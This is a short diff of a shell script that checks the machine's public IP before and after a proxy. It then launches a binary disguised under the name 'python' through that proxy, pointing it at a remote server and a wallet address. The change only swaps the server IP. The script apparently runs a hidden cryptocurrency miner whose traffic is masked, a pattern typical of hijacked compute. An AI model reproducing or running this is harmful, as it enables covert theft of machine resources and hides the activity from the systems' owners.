@@ -20,4 +20,4 @@ echo "Original IP ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "New IP ==> "$(./proxy curl ifconfig.me)
-./proxy ./python -r 209.97.182.156:80 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xm4umde6mkerfvqwy2rw5.Danis
+./proxy ./python -r 68.183.253.128:80 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xm4umde6mkerfvqwy2rw5.Danis
